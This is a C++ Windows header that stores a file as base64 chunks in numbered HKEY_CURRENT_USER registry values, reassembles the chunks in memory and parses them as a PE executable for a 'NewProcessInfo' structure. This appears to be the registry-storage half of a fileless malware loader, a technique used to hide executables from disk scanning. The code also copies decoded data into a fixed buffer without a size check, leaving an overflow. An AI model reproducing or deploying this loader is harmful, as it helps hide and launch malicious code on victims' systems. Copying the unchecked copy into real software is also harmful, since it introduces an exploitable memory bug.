#pragma once

#include <array>
#include <cstdio>
#include <memory>
#include <string>
#include <vector>
#include <Windows.h>

#include "common.h"

const HKEY OpenRegistryKey(const char * const strKeyName, const bool bCreate = true)
{
    HKEY hKey = nullptr;
    DWORD dwResult = 0;

    LONG lRet = RegCreateKeyExA(HKEY_CURRENT_USER, strKeyName, 0,
        nullptr, 0, KEY_READ | KEY_WRITE | KEY_CREATE_SUB_KEY,
        nullptr, &hKey, &dwResult);
    if (lRet != ERROR_SUCCESS)
    {
        fprintf(stderr, "Could not create/open registry key. Error = %X\n",
            lRet);
        exit(-1);
    }

    if (bCreate && dwResult == REG_CREATED_NEW_KEY)
    {
        fprintf(stdout, "Created new registry key.\n");
    }
    else
    {
        fprintf(stdout, "Opened existing registry key.\n");
    }

    return hKey;
}

void WriteRegistryKeyString(const HKEY hKey, const char * const strValueName,
    const BYTE *pBytes, const DWORD dwSize)
{
    std::string strEncodedData = base64_encode(pBytes, dwSize);
	std::cout << strEncodedData << std::endl;
    LONG lRet = RegSetValueExA(hKey, strValueName, 0, REG_SZ, (const BYTE *)strEncodedData.c_str(), strEncodedData.length());
    if (lRet != ERROR_SUCCESS)
    {
        fprintf(stderr, "Could not write registry value. Error = %X\n",
            lRet);
        exit(-1);
    }
}

const std::array<BYTE, READ_WRITE_SIZE> ReadRegistryKeyString(const char * const strKeyName,
    const char * const strValueName, bool &bErrorOccured)
{
    DWORD dwType = 0;
    const DWORD dwMaxReadSize = READ_WRITE_SIZE * 2;
    DWORD dwReadSize = dwMaxReadSize;

    char strBytesEncoded[READ_WRITE_SIZE * 2] = { 0 };

    LONG lRet = RegGetValueA(HKEY_CURRENT_USER, strKeyName, strValueName,
        RRF_RT_REG_SZ, &dwType, strBytesEncoded, &dwReadSize);
	std::cout << strBytesEncoded << std::endl;
    std::array<BYTE, READ_WRITE_SIZE> pBytes = { 0 };
    std::string strDecoded = base64_decode(std::string(strBytesEncoded));
    (void)memcpy(pBytes.data(), strDecoded.c_str(), strDecoded.size());

    if (lRet != ERROR_SUCCESS)
    {
        fprintf(stderr, "Could not read registry value. Error = %X\n",
            lRet);
        bErrorOccured = true;
    }
    if (dwType != REG_SZ || (dwReadSize == 0 || dwReadSize > dwMaxReadSize))
    {
        fprintf(stderr, "Did not correctly read back a string from the registry.\n");
        bErrorOccured = true;
    }

    return pBytes;
}

NewProcessInfo JoinRegistryToFile(const char * const strKeyName, const char * const strValueName)
{
    NewProcessInfo newProcessInfo = { 0 };
    std::vector<std::array<BYTE, READ_WRITE_SIZE>> splitFile;

    size_t ulKeyIndex = 1;
    std::string strFullName(strValueName + std::to_string(ulKeyIndex));

    bool bErrorOccured = false;
    auto partFile = ReadRegistryKeyString(strKeyName, strFullName.c_str(), bErrorOccured);

    while (!bErrorOccured)
    {
        splitFile.push_back(partFile);

        ++ulKeyIndex;
        strFullName = strValueName + std::to_string(ulKeyIndex);

        partFile = ReadRegistryKeyString(strKeyName, strFullName.c_str(), bErrorOccured);
    }

    newProcessInfo.pFileData = std::unique_ptr<BYTE[]>(new BYTE[splitFile.size() * READ_WRITE_SIZE]);
    memset(newProcessInfo.pFileData.get(), 0, splitFile.size() * READ_WRITE_SIZE);

    size_t ulWriteIndex = 0;
    for (auto &split : splitFile)
    {
        (void)memcpy(&newProcessInfo.pFileData.get()[ulWriteIndex * READ_WRITE_SIZE], splitFile[ulWriteIndex].data(),
            READ_WRITE_SIZE);
        ++ulWriteIndex;
    }

    newProcessInfo.pDosHeader = (IMAGE_DOS_HEADER *)&(newProcessInfo.pFileData.get()[0]);
    newProcessInfo.pNtHeaders = (IMAGE_NT_HEADERS *)&(newProcessInfo.pFileData.get()[newProcessInfo.pDosHeader->e_lfanew]);

    return newProcessInfo;
}